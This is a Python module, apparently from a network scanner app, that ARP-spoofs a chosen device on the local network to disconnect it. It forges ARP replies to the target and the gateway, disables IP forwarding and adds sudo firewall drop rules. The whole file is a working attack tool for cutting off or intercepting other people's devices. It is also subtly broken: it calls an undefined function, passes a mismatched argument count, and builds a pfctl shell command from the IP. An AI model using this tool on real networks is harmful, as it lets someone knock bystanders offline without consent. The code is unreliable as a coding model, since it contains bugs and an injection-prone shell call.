"""
ARP Spoofing service using Scapy.
Allows temporarily disconnecting a target device from the network.
"""
import threading
import time

from scapy.all import ARP, Ether, sendp, conf

from services.network import get_local_subnet

# Suppress Scapy warnings
conf.verb = 0

# Dict of active spoofing threads: { target_ip: { "thread": Thread, "stop": Event, "mac": str } }
_active_spoofs: dict = {}
_lock = threading.Lock()


def _get_gateway_ip() -> str:
    """Derive gateway IP from the local subnet (assumes .1)."""
    subnet = get_local_subnet()  # e.g. "192.168.11.0/24"
    prefix = subnet.rsplit(".", 1)[0]  # "192.168.11"
    return f"{prefix}.1"


def _get_mac_for_ip(ip: str) -> str:
    """Get the real MAC address of an IP using ARP request."""
    from scapy.all import srp

    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3,
        verbose=False,
    )
    if ans:
        return ans[0][1].hwsrc
    return None


def _set_ip_forwarding(enable: bool):
    """Enable or disable IP forwarding at the OS level."""
    import subprocess
    import platform

    val = "1" if enable else "0"
    try:
        if platform.system() == "Darwin":  # macOS
            subprocess.run(["sudo", "sysctl", "-w", f"net.inet.ip.forwarding={val}"], capture_output=True)
        else:  # Linux
            subprocess.run(["sudo", "sysctl", "-w", f"net.ipv4.ip_forward={val}"], capture_output=True)
    except Exception as e:
        print(f"⚠️ Failed to set ip_forwarding: {e}")


def _manage_firewall_block(ip: str, block: bool):
    """Add or remove firewall rules to drop traffic from target IP."""
    import subprocess
    import platform

    try:
        if platform.system() == "Darwin":  # macOS (using pfctl)
            # Create a temporary anchor for our blocks
            anchor_name = f"com.network.scanner.block.{ip.replace('.', '_')}"
            if block:
                # Add rule: block drop from <ip> to any
                rule = f"block drop from {ip} to any"
                cmd = f'echo "{rule}" | sudo pfctl -a {anchor_name} -f -'
                subprocess.run(cmd, shell=True, capture_output=True)
                subprocess.run(["sudo", "pfctl", "-e"], capture_output=True) # Ensure pf is enabled
            else:
                subprocess.run(["sudo", "pfctl", "-a", anchor_name, "-F", "all"], capture_output=True)
        
        else:  # Linux (using iptables)
            action = "-A" if block else "-D"
            cmd = ["sudo", "iptables", action, "FORWARD", "-s", ip, "-j", "DROP"]
            subprocess.run(cmd, capture_output=True)
    except Exception as e:
        print(f"⚠️ Firewall management failed for {ip}: {e}")


def _get_local_mac() -> str:
    """Get this machine's MAC address."""
    from scapy.all import get_if_hwaddr
    return get_if_hwaddr(conf.iface)


def _spoof_loop(target_ip: str, target_mac: str, gateway_ip: str, stop_event: threading.Event):
    local_mac = _get_local_mac()
    
    # 👇 ดึง gateway MAC จริงก่อน
    try:
        gateway_mac = _get_gateway_mac(gateway_ip)
    except RuntimeError:
        print(f"❌ Cannot resolve gateway MAC")
        return

    print(f"⚡ ARP spoofing started: {target_ip} ({target_mac})")
    print(f"🌐 Gateway: {gateway_ip} ({gateway_mac})")  # เพิ่ม log ตรงนี้

    pkt_to_target = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=local_mac,
    )

    # ✅ ส่งตรงไปที่ gateway MAC
    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
        op=2,
        pdst=gateway_ip,
        hwdst=gateway_mac,  # 👈 เพิ่มตรงนี้
        psrc=target_ip,
        hwsrc=local_mac,
    )

    while not stop_event.is_set():
        sendp(pkt_to_target, verbose=False)
        sendp(pkt_to_gateway, verbose=False)
        stop_event.wait(1)

    print(f"🛑 ARP spoofing stopped: {target_ip}")


def _restore_arp(target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str):
    """Send correct ARP replies to restore normal network operation."""
    try:
        # Tell the target the real gateway MAC
        restore_target = Ether(dst=target_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac
        )

        # Tell the gateway the real target MAC
        restore_gateway = Ether(dst=gateway_mac) / ARP(
            op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac
        )

        # Send multiple times to make sure it sticks
        for _ in range(5):
            sendp(restore_target, verbose=False)
            sendp(restore_gateway, verbose=False)
            time.sleep(0.2)

        print(f"✅ ARP restored for {target_ip}")
    except Exception as e:
        print(f"⚠️ Failed to restore ARP for {target_ip}: {e}")


def start_spoof(target_ip: str, target_mac: str) -> bool:
    """Start ARP spoofing a target device. Returns True if started successfully."""
    with _lock:
        if target_ip in _active_spoofs:
            return False  # Already being spoofed

        # 1. Ensure IP Forwarding is OFF (prevents Mac from acting as a bridge)
        _set_ip_forwarding(False)

        # 2. Add Firewall Block (Kernel-level drop)
        _manage_firewall_block(target_ip, True)

        # 3. Resolve Gateway MAC
        gateway_ip = _get_gateway_ip()
        gateway_mac = _get_mac_for_ip(gateway_ip)
        if not gateway_mac:
            _manage_firewall_block(target_ip, False) # Cleanup if failed
            raise RuntimeError(f"Could not resolve gateway MAC for {gateway_ip}")

        # 4. Resolve fresh Target MAC
        fresh_target_mac = _get_mac_for_ip(target_ip)
        actual_target_mac = fresh_target_mac if fresh_target_mac else target_mac

        stop_event = threading.Event()

        thread = threading.Thread(
            target=_spoof_loop,
            args=(target_ip, actual_target_mac, gateway_ip, gateway_mac, stop_event),
            daemon=True,
        )
        thread.start()

        _active_spoofs[target_ip] = {
            "thread": thread,
            "stop": stop_event,
            "mac": actual_target_mac,
            "gateway_ip": gateway_ip,
            "gateway_mac": gateway_mac,
            "started_at": time.time(),
        }
        return True


def stop_spoof(target_ip: str) -> bool:
    """Stop ARP spoofing and restore the target's ARP table. Returns True if stopped."""
    with _lock:
        entry = _active_spoofs.pop(target_ip, None)

    if entry is None:
        return False  # Not being spoofed

    # 1. Stop the spoofing thread
    entry["stop"].set()
    entry["thread"].join(timeout=5)

    # 2. Remove Firewall Block
    _manage_firewall_block(target_ip, False)

    # 3. Restore ARP table for both target and gateway
    _restore_arp(target_ip, entry["mac"], entry["gateway_ip"], entry["gateway_mac"])
    
    print(f"🛑 ARP spoofing stopped and restored: {target_ip}")
    return True


def get_active_spoofs() -> list[dict]:
    """Return a list of currently spoofed targets."""
    with _lock:
        return [
            {"ip": ip, "mac": info["mac"], "started_at": info["started_at"]}
            for ip, info in _active_spoofs.items()
        ]
